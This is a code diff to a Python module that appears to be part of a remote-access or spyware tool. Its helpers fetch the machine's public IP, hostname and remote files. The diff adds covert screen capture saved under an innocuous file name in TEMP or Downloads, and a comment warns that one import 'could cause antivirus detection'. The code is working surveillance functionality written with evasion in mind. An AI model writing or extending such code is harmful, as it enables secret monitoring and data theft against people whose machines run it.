@@ -1,7 +1,8 @@
 from socket import gethostname
 from requests import get
 from pyautogui import screenshot
-import json, platform
+from getpass import getuser # COULD CAUSE ANTIVIRUS DETECTION!
+import json, platform, os
 
 def get_ip():
     return get('https://api.ipify.org').content.decode()
@@ -17,5 +18,9 @@ def download_file(url):
     return file if type(file) == bytes else file.encode()
 
 def get_screenshot():
-    #screenshot().save()
-    return "pes"
+    if platform.system().lower() == "windows":
+        savePath = os.path.join(os.getenv('TEMP'), "Image26.png")
+    else:
+        savePath = "/home/"+getuser()+"/Downloads/Image26.png"
+    screenshot().save(savePath)
+    return savePath
